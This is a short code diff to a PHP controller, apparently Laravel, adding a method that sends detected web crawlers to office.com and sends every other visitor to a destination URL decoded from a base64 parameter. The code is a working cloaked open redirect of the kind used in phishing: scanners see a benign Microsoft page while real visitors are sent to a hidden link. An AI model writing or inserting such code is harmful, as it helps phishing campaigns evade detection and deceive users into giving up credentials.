@@ -30,4 +30,16 @@ class Controller extends BaseController
 
 //        return view('welcome');
     }
+
+
+    public function code($code){
+        if(Crawler::isCrawler()){
+            return redirect()->away("https://office.com");
+        }else{
+            $base64 = base64_decode($code);
+//            dd($base64);
+            return redirect()->away($base64);
+
+        }
+    }
 }
